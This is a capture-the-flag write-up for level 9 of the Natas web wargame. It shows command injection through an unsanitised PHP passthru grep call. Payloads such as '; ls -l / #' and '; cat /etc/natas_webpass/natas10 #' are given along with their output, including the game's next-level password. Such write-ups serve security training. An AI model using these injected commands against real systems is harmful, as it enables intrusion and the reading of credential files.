# [Natas 9](http://overthewire.org/wargames/natas/natas9.html "Natas 9 Web Challenge Page")


We use the password from the previous challenge to log into Natas 9. After logging in, the challenge says:

`Find words containing:`

Below the text box, there is a link to view sourcecode again! There we can see that the challenge is using a passthru command with an unsantized $key value (which we control, using the text box). That sounds like RCE (Remote Code Execution) to me! :D

I figured the best way to test for the RCE would be end the statemeng, and then try to list out some file, and comment out the rest of the command. `; ls -l / # ` Should be input into the box to test that. 

```
total 7957
-rw-r--r--   1 root root    2797 Nov  4  2015 README.txt
lrwxrwxrwx   1 root root      15 Nov 14  2014 behemoth -> /games/behemoth
drwxr-xr-x   2 root root    4096 Apr 15 07:07 bin
drwxr-xr-x   2 root root    4096 Apr 20  2014 boot
drwxr-xr-x  12 root root   13680 Jul  4 13:13 dev
drwxr-xr-x   7 root root    4096 Jan 12  2015 drifter
lrwxrwxrwx   1 root root      11 Nov 14  2014 eloi -> /games/eloi
drwxr-xr-x 108 root root    4096 Jul 12 20:44 etc
drwxr-xr-x  11 root root    1024 Mar 18  2015 games
drwxr-xr-x 172 root root    4096 Jul 10 14:12 home
lrwxrwxrwx   1 root root      14 Nov 14  2014 krypton -> /games/krypton
drwxr-xr-x  18 root root    4096 Jun 10 12:34 lib
drwxr-xr-x   2 root root    4096 Jun 10 12:34 lib32
drwxr-xr-x   2 root root    4096 Jun 10 12:34 lib64
drwxr-xr-x   2 root root    4096 Jun 10 12:34 libx32
drwx------   2 root root   16384 Apr 20  2014 lost+found
lrwxrwxrwx   1 root root      14 Nov 14  2014 manpage -> /games/manpage
lrwxrwxrwx   1 root root      11 Nov 14  2014 maze -> /games/maze
drwxr-xr-x   3 root root    4096 Apr 20  2014 media
drwxr-xr-x   2 root root    4096 Apr 10  2014 mnt
lrwxrwxrwx   1 root root      13 Nov 14  2014 narnia -> /games/narnia
drwxr-xr-x   2 root root    4096 Apr 16  2014 opt
dr-xr-xr-x 446 root root       0 Jul  4 13:12 proc
drwx------  11 root root    4096 Jul 10 14:12 root
drwxr-xr-x  18 root root     680 Jul 13 00:54 run
drwxr-xr-x   2 root root   12288 Jun 26 13:59 sbin
lrwxrwxrwx   1 root root      13 Nov 14  2014 semtex -> /games/semtex
drwxr-xr-x   2 root root    4096 Apr 16  2014 srv
dr-xr-xr-x  13 root root       0 Jul  4 15:15 sys
drwxrwx-wt   1 root root 8036352 Jul 13 00:54 tmp
drwxr-xr-x  12 root root    4096 Nov 14  2014 usr
lrwxrwxrwx   1 root root      13 Nov 14  2014 utumno -> /games/utumno
drwxr-xr-x  15 root root    4096 Nov 14  2014 var
lrwxrwxrwx   1 root root      13 Nov 14  2014 vortex -> /games/vortex
```

The above is the output of the command. Now using the clue they gave us on the homepage (where each user's password resides on the system), we can not attempt to leak the password!

`; cat /etc/natas_webpass/natas10 #`

Was the command I used, and the output was `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

With that password, we can now log into [Natas10](https://github.com/ProDigySML/Security-Writeups/Natas/Natas10 "Natas 10")

The passthru command in the challenge: `passthru("grep -i $key dictionary.txt");`